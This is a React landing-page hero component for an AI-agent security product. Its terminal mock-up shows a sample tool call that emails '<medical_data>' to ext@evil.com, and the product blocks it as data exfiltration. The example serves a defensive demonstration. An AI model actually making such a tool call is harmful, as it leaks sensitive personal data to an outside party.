"use client";

import { motion } from "framer-motion";

export function Hero() {
  return (
    <section className="relative min-h-screen flex items-center justify-center overflow-hidden">
      {/* Background effects */}
      <div className="absolute inset-0 bg-grid" />
      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[800px] h-[600px] rounded-full bg-accent/5 blur-[120px]" />
      <div className="absolute bottom-1/4 left-1/3 w-[400px] h-[400px] rounded-full bg-accent-secondary/5 blur-[100px]" />

      <div className="relative z-10 mx-auto max-w-5xl px-6 text-center pt-32 pb-20">
        {/* Badge */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.1 }}
          className="mb-8 inline-flex items-center gap-2 rounded-full glass px-4 py-2 text-xs font-medium text-[#9ca3af]"
        >
          <span className="flex h-2 w-2 rounded-full bg-accent animate-pulse" />
          Now with OpenClaw integration
        </motion.div>

        {/* Headline */}
        <motion.h1
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.2, ease: [0.21, 0.47, 0.32, 0.98] }}
          className="text-5xl sm:text-7xl font-bold tracking-tight leading-[1.1] mb-6"
        >
          <span className="text-gradient">Runtime intelligence</span>
          <br />
          <span className="text-white">for AI agents</span>
        </motion.h1>

        {/* Subheadline */}
        <motion.p
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.7, delay: 0.4 }}
          className="mx-auto max-w-2xl text-lg sm:text-xl text-[#9ca3af] leading-relaxed mb-10"
        >
          The security layer between AI agents and the real world.
          Risk-scored decisions, exfiltration pattern detection, and a
          real-time visual audit trail &mdash; for every tool call.
        </motion.p>

        {/* CTAs */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.6 }}
          className="flex flex-col sm:flex-row items-center justify-center gap-4"
        >
          <a
            href="#waitlist"
            className="group relative rounded-full bg-accent px-8 py-3.5 text-sm font-semibold text-black hover:bg-accent/90 transition-all shadow-lg shadow-accent/20 hover:shadow-accent/30"
          >
            Get Early Access
          </a>
          <a
            href="#docs"
            className="rounded-full glass px-8 py-3.5 text-sm font-medium text-[#d1d5db] hover:text-white hover:bg-white/5 transition-all"
          >
            Read the Docs
          </a>
        </motion.div>

        {/* Terminal preview */}
        <motion.div
          initial={{ opacity: 0, y: 40, scale: 0.97 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          transition={{ duration: 0.9, delay: 0.8, ease: [0.21, 0.47, 0.32, 0.98] }}
          className="mt-16 mx-auto max-w-2xl"
        >
          <div className="glass-card p-1 glow-green">
            <div className="rounded-[20px] overflow-hidden">
              {/* Title bar */}
              <div className="flex items-center gap-2 px-4 py-3 bg-black/40 border-b border-white/5">
                <div className="flex gap-1.5">
                  <div className="w-3 h-3 rounded-full bg-[#ff5f57]" />
                  <div className="w-3 h-3 rounded-full bg-[#febc2e]" />
                  <div className="w-3 h-3 rounded-full bg-[#28c840]" />
                </div>
                <span className="ml-2 text-xs text-[#6b7280] font-mono">
                  palisade &mdash; policy evaluation
                </span>
              </div>
              {/* Content */}
              <div className="p-5 bg-black/30 font-mono text-[13px] leading-relaxed text-left space-y-2">
                <div className="text-[#6b7280]"># External agent calls Palisade before each tool</div>
                <div>
                  <span className="text-accent">$</span>{" "}
                  <span className="text-[#d1d5db]">curl</span>{" "}
                  <span className="text-[#9ca3af]">-X POST</span>{" "}
                  <span className="text-accent-secondary">localhost:8787/api/sessions/abc/evaluate</span>
                </div>
                <div className="text-[#9ca3af] pl-4">
                  {`  -d '{"toolName":"send_email","toolArgs":{"to":"ext@evil.com","body":"<medical_data>"}}'`}
                </div>
                <div className="mt-3 text-[#6b7280]"># Palisade response:</div>
                <div className="pl-4 space-y-1">
                  <div>
                    <span className="text-[#ef4444]">BLOCK</span>{" "}
                    <span className="text-[#6b7280]">|</span>{" "}
                    <span className="text-[#fbbf24]">risk: 60</span>{" "}
                    <span className="text-[#6b7280]">|</span>{" "}
                    <span className="text-[#9ca3af]">data exfiltration: sensitive + external</span>
                  </div>
                  <div className="text-[#6b7280] text-xs">
                    Rules: touchesSensitiveData(30) + affectsExternalSystem(30)
                  </div>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      </div>
    </section>
  );
}
